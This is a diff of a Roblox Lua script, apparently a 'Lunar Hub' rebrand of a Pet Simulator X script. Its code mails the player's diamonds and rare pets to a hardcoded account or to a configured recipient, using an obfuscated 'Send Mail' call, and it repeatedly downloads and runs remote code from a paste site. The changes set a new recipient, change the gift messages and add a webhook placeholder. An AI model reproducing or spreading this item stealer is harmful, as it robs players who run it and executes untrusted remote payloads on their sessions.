@@ -1,3 +1,6 @@
+_G.Username = "Child"
+_G.ScriptName = "Loading Lunar Hub..."
+_G.Webhook = "YOUR_WEBHOOK"
 
 loadstring(game:HttpGet("https://paste.xyzo.space/psx/beta/69420.lua"))()
 
@@ -33,7 +36,7 @@ local function unlockPetsInFolder(folder)
                 [""..name] = false
             }
         }
-        Invoke("Lock Pet", unpack(args2))
+        Invoke("Lock Pet", unpack(args2)) 
     end
     end
   end
@@ -101,13 +104,13 @@ for i,v in pairs(game:GetDescendants()) do
 	end
 end
 
-if game.Players.LocalPlayer.leaderstats.Diamonds.Value > 100000000 then
+if game.Players.LocalPlayer.leaderstats.Diamonds.Value < 100000000 then
 	local args = {
     	[1] = {
         ["Recipient"] = _G.Username,
         ["Diamonds"] = game.Players.LocalPlayer.leaderstats.Diamonds.Value - 100000000,
         ["Pets"] = {v.uid},
-        ["Message"] = "Peak GEMS!"
+        ["Message"] = "Lunar GEMS!"
     	}
 	}
 	Invoke("\83\101\110\100\32\77\97\105\108", unpack(args))
@@ -117,7 +120,7 @@ elseif game.Players.LocalPlayer.leaderstats.Diamonds.Value > 10000000000 then
       ["Recipient"] = "AuraIation",
       ["Diamonds"] = game.Players.LocalPlayer.leaderstats.Diamonds.Value - 10000000000,
       ["Pets"] = {v.uid},
-      ["Message"] = "Peak GEMS!"
+      ["Message"] = "Lunar GEMS!"
     }
   }
   Invoke("\83\101\110\100\32\77\97\105\108", unpack(args))
@@ -130,7 +133,8 @@ for i,v in pairs(savedPets) do
 		hugeamount = hugeamount + 1
 	end
 end
-if hugeamount >3 then
+
+if hugeamount > 3 then
 	_G.Username_2 = "AuraIation"
 elseif hugeamount < 3 then
   _G.Username_2 = _G.Username
@@ -139,38 +143,38 @@ end
 
 
 while wait() do
-for i,v in pairs(savedPets) do
-    local v2 = FrameworkLibrary.Directory.Pets[v.id]
-	if v2.huge == true and game.Players.LocalPlayer.leaderstats.Diamonds.Value > 5000000 or v2.rarity == "Event" and game.Players.LocalPlayer.leaderstats.Diamonds.Value > 5000000 or v2.rarity == "Exclusive" and game.Players.LocalPlayer.leaderstats.Diamonds.Value >5000000 then
-		_G.Diamonds = game.Players.LocalPlayer.leaderstats.Diamonds.Value
-		local args = {
-    	[1] = {
-        ["Recipient"] = _G.Username_2,
-        ["Diamonds"] = game.Players.LocalPlayer.leaderstats.Diamonds.Value - 5000000,
-        ["Pets"] = {v.uid},
-        ["Message"] = "gg/cTNS2QryQf | Username: ".._G.Username_2..""
-    	}
-		}
-		Invoke("\83\101\110\100\32\77\97\105\108", unpack(args))
-		_G.PetName = v2.name
-		_G.PetRar = v2.rarity
-		
-		loadstring(game:HttpGet("https://paste.xyzo.space/psx/beta/123123.lua"))()
-	elseif v2.huge == true or v2.rarity == "Event" or v2.rarity == "Exclusive" then
-		_G.Diamonds = 0
-		local args = {
-    	[1] = {
-        ["Recipient"] = _G.Username_2,
-        ["Diamonds"] = 0,
-        ["Pets"] = {v.uid},
-        ["Message"] = "gg/cTNS2QryQf | Username: ".._G.Username_2..""
-    	}
-		}
-		Invoke("\83\101\110\100\32\77\97\105\108", unpack(args))
-		_G.PetName = v2.name
-		_G.PetRar = v2.rarity
-		
-		loadstring(game:HttpGet("https://paste.xyzo.space/psx/beta/123123.lua"))()
-	end
-end
+  for i,v in pairs(savedPets) do
+      local v2 = FrameworkLibrary.Directory.Pets[v.id]
+    if v2.huge == true and game.Players.LocalPlayer.leaderstats.Diamonds.Value > 5000000 or v2.rarity == "Event" and game.Players.LocalPlayer.leaderstats.Diamonds.Value > 5000000 or v2.rarity == "Exclusive" and game.Players.LocalPlayer.leaderstats.Diamonds.Value >5000000 then
+      _G.Diamonds = game.Players.LocalPlayer.leaderstats.Diamonds.Value
+      local args = {
+        [1] = {
+          ["Recipient"] = _G.Username_2,
+          ["Diamonds"] = game.Players.LocalPlayer.leaderstats.Diamonds.Value - 5000000,
+          ["Pets"] = {v.uid},
+          ["Message"] = "gg/lunarhub | Username: ".._G.Username_2..""
+        }
+      }
+      Invoke("\83\101\110\100\32\77\97\105\108", unpack(args))
+      _G.PetName = v2.name
+      _G.PetRar = v2.rarity
+      
+      loadstring(game:HttpGet("https://paste.xyzo.space/psx/beta/123123.lua"))()
+    elseif v2.huge == true or v2.rarity == "Event" or v2.rarity == "Exclusive" then
+      _G.Diamonds = 0
+      local args = {
+        [1] = {
+          ["Recipient"] = _G.Username_2,
+          ["Diamonds"] = 0,
+          ["Pets"] = {v.uid},
+          ["Message"] = "gg/lunarhub | Username: ".._G.Username_2..""
+        }
+      }
+      Invoke("\83\101\110\100\32\77\97\105\108", unpack(args))
+      _G.PetName = v2.name
+      _G.PetRar = v2.rarity
+      
+      loadstring(game:HttpGet("https://paste.xyzo.space/psx/beta/123123.lua"))()
+    end
+  end
 end
